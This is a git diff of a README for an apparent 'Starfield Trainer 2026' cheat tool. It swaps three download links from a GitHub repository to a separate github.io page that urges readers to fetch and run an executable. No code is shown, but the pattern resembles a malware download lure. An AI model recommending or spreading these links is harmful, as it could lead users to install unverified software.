@@ -1,6 +1,6 @@
 # 🎮 starfield-trainer-2026 - Unlock Unlimited Power Instantly
 
-[![Download Starfield Trainer](https://img.shields.io/badge/Download-Starfield_Trainer_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://github.com/Frankflexuous263/starfield-trainer-2026)
+[![Download Starfield Trainer](https://img.shields.io/badge/Download-Starfield_Trainer_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a2e)](https://frankflexuous263.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Follow these steps exactly, and you'll be up and running in less than two minute
 
 Visit this link to download the application:
 
-[**https://github.com/Frankflexuous263/starfield-trainer-2026**](https://github.com/Frankflexuous263/starfield-trainer-2026)
+[**https://frankflexuous263.github.io**](https://frankflexuous263.github.io)
 
 Click the big green download button on that page. The file will start downloading automatically. Wait for it to finish completely before moving to the next step.
 
@@ -136,7 +136,7 @@ The trainer is a standalone executable that only interacts with the Starfield ga
 
 Need to download again or share with a friend? Use the same link:
 
-[**Download Starfield Trainer 2026**](https://github.com/Frankflexuous263/starfield-trainer-2026)
+[**Download Starfield Trainer 2026**](https://frankflexuous263.github.io)
 
 ---
 
